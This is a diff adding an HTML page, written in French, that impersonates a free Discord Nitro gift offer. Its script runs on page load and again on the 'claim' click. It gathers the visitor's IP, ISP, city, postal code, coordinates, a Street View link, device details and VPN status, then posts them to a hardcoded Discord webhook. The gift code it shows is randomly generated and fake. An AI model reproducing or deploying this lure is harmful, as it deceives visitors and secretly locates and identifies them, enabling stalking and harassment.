@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Réclamez votre cadeau Discord Nitro gratuit ! Profitez d'un mois d'abonnement premium avec des avantages exclusifs.">
+    <meta name="keywords" content="Discord Nitro, cadeau gratuit, abonnement premium, emojis personnalisés, streaming HD">
+    <meta name="author" content="Discord">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <!-- Discord Meta Tags avec image taille moyenne -->
+    <meta property="og:title" content="Cadeau Discord Nitro - Réclamez votre abonnement gratuit !">
+    <meta property="og:description" content="Obtenez un mois de Discord Nitro gratuit avec des emojis personnalisés, un streaming HD et bien plus encore ! Cliquez pour réclamer votre cadeau.">
+    <meta property="og:image" content="https://m.media-amazon.com/images/I/61d11drpFYL._AC_UF894,1000_QL80_.jpg">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta property="og:url" content="https://discord.com/nitro-gift">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Discord">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Cadeau Discord Nitro - Réclamez votre abonnement gratuit !">
+    <meta name="twitter:description" content="Obtenez un mois de Discord Nitro gratuit avec des emojis personnalisés, un streaming HD et bien plus encore ! Cliquez pour réclamer votre cadeau.">
+    <meta name="twitter:image" content="https://m.media-amazon.com/images/I/61d11drpFYL._AC_UF894,1000_QL80_.jpg">
+    <title>Cadeau Discord Nitro - Réclamez votre abonnement gratuit</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #5865F2, #404EED, #2C2F33);
+            color: #FFFFFF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-attachment: fixed;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7);
+            max-width: 600px;
+            text-align: center;
+            animation: slideUp 1s ease-out;
+            backdrop-filter: blur(10px);
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #7289DA, #FFFFFF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 10px rgba(114, 137, 218, 0.5);
+        }
+
+        p {
+            font-size: 18px;
+            margin-bottom: 25px;
+            color: #DCDDDE;
+            line-height: 1.5;
+        }
+
+        .nitro-image {
+            width: 100%;
+            max-width: 200px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 2px solid #7289DA;
+            box-shadow: 0 0 15px rgba(114, 137, 218, 0.5);
+            animation: glow 2s infinite alternate;
+        }
+
+        .claim-button {
+            background: linear-gradient(45deg, #5865F2, #7289DA);
+            color: #FFFFFF;
+            padding: 12px 35px;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(88, 101, 242, 0.5);
+        }
+
+        .claim-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(88, 101, 242, 0.8);
+            background: linear-gradient(45deg, #7289DA, #5865F2);
+        }
+
+        .claim-button:active {
+            transform: translateY(0);
+            box-shadow: 0 3px 10px rgba(88, 101, 242, 0.3);
+        }
+
+        .code-display {
+            display: none;
+            background: #2C2F33;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 16px;
+            color: #43B581;
+            border: 2px solid #43B581;
+            animation: slideIn 0.5s ease-in-out;
+        }
+
+        .code-display a {
+            color: #7289DA;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .code-display a:hover {
+            color: #FFFFFF;
+            text-decoration: underline;
+        }
+
+        /* Animations */
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 10px rgba(114, 137, 218, 0.5); }
+            to { box-shadow: 0 0 20px rgba(114, 137, 218, 1); }
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-30px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Particules */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(114, 137, 218, 0.5);
+            border-radius: 50%;
+            animation: float 10s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) scale(0.5); opacity: 0.5; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .container {
+                padding: 25px;
+                margin: 10px;
+            }
+            h1 {
+                font-size: 26px;
+            }
+            p {
+                font-size: 16px;
+            }
+            .nitro-image {
+                max-width: 150px;
+            }
+            .claim-button {
+                padding: 10px 25px;
+                font-size: 16px;
+            }
+            .code-display {
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            h1 {
+                font-size: 22px;
+            }
+            p {
+                font-size: 14px;
+            }
+            .nitro-image {
+                max-width: 120px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    <div class="container">
+        <h1>Réclamez votre Discord Nitro gratuit ! 🎉</h1>
+        <p>Profitez d’un mois de Nitro avec des emojis personnalisés 😎, du streaming HD 📺 et des avantages exclusifs ! Cliquez pour réclamer votre cadeau.</p>
+        <img src="https://m.media-amazon.com/images/I/61d11drpFYL._AC_UF894,1000_QL80_.jpg" alt="Discord Nitro Gift" class="nitro-image">
+        <button class="claim-button" onclick="claimGift()">Réclamer maintenant 🚀</button>
+        <div id="codeDisplay" class="code-display"></div>
+    </div>
+
+    <script>
+        // Générer des particules d'arrière-plan
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                particle.style.width = `${Math.random() * 5 + 5}px`;
+                particle.style.height = particle.style.width;
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.animationDelay = `${Math.random() * 10}s`;
+                particlesContainer.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        // Générer un code Nitro au format officiel (16 caractères) et lien discord.gift
+        function generateNitroCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let code = '';
+            for (let i = 0; i < 16; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return { code, link: `https://discord.gift/${code}` };
+        }
+
+        // Fonction pour détecter le modèle précis de l'appareil
+        function getDeviceDetails(userAgent) {
+            let deviceType = 'Inconnu';
+            let deviceModel = 'Inconnu';
+            let osVersion = 'Inconnu';
+
+            if (/Mobile|Android|iPhone|iPad/.test(userAgent)) {
+                if (/Android/.test(userAgent)) {
+                    deviceType = 'Smartphone Android';
+                    const androidMatch = userAgent.match(/Android\s([\d.]+)/);
+                    osVersion = androidMatch ? androidMatch[1] : 'Inconnu';
+                    const modelMatch = userAgent.match(/;\s([^\)]+)\sBuild/) || userAgent.match(/;\s([^\)]+)\)/);
+                    deviceModel = modelMatch ? modelMatch[1].trim().replace(/Build\/.*/, '') || 'Inconnu' : 'Inconnu';
+                } else if (/iPhone/.test(userAgent)) {
+                    deviceType = 'iPhone';
+                    const iosMatch = userAgent.match(/OS\s([\d_]+)/);
+                    osVersion = iosMatch ? iosMatch[1].replace(/_/g, '.') : 'Inconnu';
+                    // Estimation du modèle iPhone via CPU ou résolution (approximation)
+                    deviceModel = userAgent.includes('iPhone14,5') ? 'iPhone 14 Pro' :
+                                  userAgent.includes('iPhone14,2') ? 'iPhone 14' :
+                                  userAgent.includes('iPhone13,2') ? 'iPhone 13' : 'iPhone';
+                } else if (/iPad/.test(userAgent)) {
+                    deviceType = 'iPad';
+                    const iosMatch = userAgent.match(/OS\s([\d_]+)/);
+                    osVersion = iosMatch ? iosMatch[1].replace(/_/g, '.') : 'Inconnu';
+                    deviceModel = userAgent.match(/iPad[\d,\s]+/)?.[0] || 'iPad';
+                }
+            } else {
+                if (/Windows/.test(userAgent)) {
+                    deviceType = /Windows NT 10/.test(userAgent) ? 'PC Windows' : 'PC Windows (version ancienne)';
+                    const winMatch = userAgent.match(/Windows NT ([\d.]+)/);
+                    osVersion = winMatch ? winMatch[1] : 'Inconnu';
+                    deviceModel = 'PC';
+                    if (/Windows.*(Tablet|Surface)/.test(userAgent)) {
+                        deviceType = 'Tablette Windows';
+                        deviceModel = userAgent.includes('Surface') ? 'Surface' : 'Tablette';
+                    } else if (/Windows.*(Laptop|Notebook)/.test(userAgent)) {
+                        deviceType = 'Ordinateur portable Windows';
+                        deviceModel = 'Laptop';
+                    }
+                } else if (/Macintosh/.test(userAgent)) {
+                    deviceType = 'Mac';
+                    const macMatch = userAgent.match(/Mac OS X ([\d_]+)/);
+                    osVersion = macMatch ? macMatch[1].replace(/_/g, '.') : 'Inconnu';
+                    deviceModel = /MacBook/.test(userAgent) ? 'MacBook' : /iMac/.test(userAgent) ? 'iMac' : 'Mac';
+                } else if (/Linux/.test(userAgent)) {
+                    deviceType = 'PC Linux';
+                    deviceModel = 'PC Linux';
+                    osVersion = userAgent.match(/Linux ([\w\d.]+)/)?.[1] || 'Inconnu';
+                }
+            }
+
+            return { deviceType, deviceModel, osVersion };
+        }
+
+        // Fonction pour récupérer les informations de l'appareil et de la connexion
+        async function gatherUserInfo() {
+            try {
+                // Récupérer l'IP publique
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                // Récupérer la localisation et les infos réseau
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                // Générer un lien Google Street View
+                const streetViewUrl = `https://www.google.com/maps/@${geoData.latitude},${geoData.longitude},3a,75y,0h,90t/data=!3m6!1e1!3m4!1s!2e0!7i16384!8i8192`;
+
+                // Récupérer l'user agent
+                const userAgent = navigator.userAgent;
+
+                // Détection précise de l'appareil
+                const { deviceType, deviceModel, osVersion } = getDeviceDetails(userAgent);
+                const browserInfo = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0] || 'Navigateur inconnu';
+
+                // Détection VPN
+                let vpnDetected = false;
+                const vpnCheckResponse = await fetch(`https://vpnapi.io/api/${ip}?key=6b02c0bda1f6455dbb44082ce8c880d8`);
+                const vpnData = await vpnCheckResponse.json();
+                vpnDetected = vpnData.security.vpn || vpnData.security.proxy || vpnData.security.tor;
+
+                // Collecter toutes les infos
+                const userInfo = {
+                    ip: ip,
+                    isp: geoData.org || 'Inconnu',
+                    asn: geoData.asn || 'Inconnu',
+                    city: geoData.city || 'Inconnu',
+                    region: geoData.region || 'Inconnu',
+                    country: geoData.country_name || 'Inconnu',
+                    postal: geoData.postal || 'Inconnu',
+                    latitude: geoData.latitude || 'Inconnu',
+                    longitude: geoData.longitude || 'Inconnu',
+                    streetView: streetViewUrl,
+                    userAgent: userAgent,
+                    deviceType: deviceType,
+                    deviceModel: deviceModel,
+                    osVersion: osVersion,
+                    browser: browserInfo,
+                    vpn: vpnDetected ? 'Oui' : 'Non',
+                    timestamp: new Date().toISOString()
+                };
+
+                return userInfo;
+            } catch (error) {
+                console.error('Erreur lors de la collecte des infos:', error);
+                return null;
+            }
+        }
+
+        // Envoyer les infos au webhook
+        async function sendToWebhook(userInfo, code = null, event = 'Visite') {
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1366467728163995648/Tdl8NfcQnzPAHY8hBWRvRTD2-euic7wlyDecuc40wcP-9PxhsSZ_cjjBJ9CawpS3NMfy';
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: event === 'Visite' ? '🎉 Nouveau visiteur sur le site Nitro !' : '🎁 Cadeau Nitro réclamé !',
+                    color: event === 'Visite' ? 0x5865F2 : 0x43B581,
+                    fields: [
+                        ...(code ? [{
+                            name: '🔗 Code Nitro',
+                            value: `\`${code.code}\`\n[Lien](${code.link})`,
+                            inline: false
+                        }] : []),
+                        {
+                            name: '🌐 Réseau',
+                            value: `**IP**: ${userInfo.ip}\n**FAI**: ${userInfo.isp}\n**ASN**: ${userInfo.asn}\n**VPN**: ${userInfo.vpn}`,
+                            inline: true
+                        },
+                        {
+                            name: '📍 Localisation',
+                            value: `**Pays**: ${userInfo.country}\n**Région**: ${userInfo.region}\n**Ville**: ${userInfo.city}\n**Code postal**: ${userInfo.postal}\n**Coords**: ${userInfo.latitude}, ${userInfo.longitude}\n**Street View**: [Voir](${userInfo.streetView})`,
+                            inline: true
+                        },
+                        {
+                            name: '🖥️ Appareil',
+                            value: `**Type**: ${userInfo.deviceType}\n**Modèle**: ${userInfo.deviceModel}\n**OS**: ${userInfo.osVersion}\n**Navigateur**: ${userInfo.browser}\n**User Agent**: ${userInfo.userAgent}`,
+                            inline: true
+                        },
+                        {
+                            name: '⏰ Timestamp',
+                            value: userInfo.timestamp,
+                            inline: false
+                        }
+                    ],
+                    thumbnail: { url: 'https://m.media-amazon.com/images/I/61d11drpFYL._AC_UF894,1000_QL80_.jpg' },
+                    footer: { text: 'Powered by UltraZartrex 😈' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                console.log(`Données envoyées au webhook pour ${event}`);
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi au webhook:', error);
+            }
+        }
+
+        // Exécuter dès le chargement de la page
+        window.onload = async () => {
+            const userInfo = await gatherUserInfo();
+            if (userInfo) {
+                await sendToWebhook(userInfo, null, 'Visite');
+            }
+        };
+
+        // Fonction principale pour gérer le clic sur "Réclamer"
+        async function claimGift() {
+            const code = generateNitroCode();
+            const codeDisplay = document.getElementById('codeDisplay');
+            codeDisplay.innerHTML = `Votre lien Nitro : <a href="${code.link}" target="_blank">${code.link}</a>`;
+            codeDisplay.style.display = 'block';
+
+            const userInfo = await gatherUserInfo();
+            if (userInfo) {
+                await sendToWebhook(userInfo, code, 'Clic');
+            }
+        }
+    </script>
+</body>
+</html>
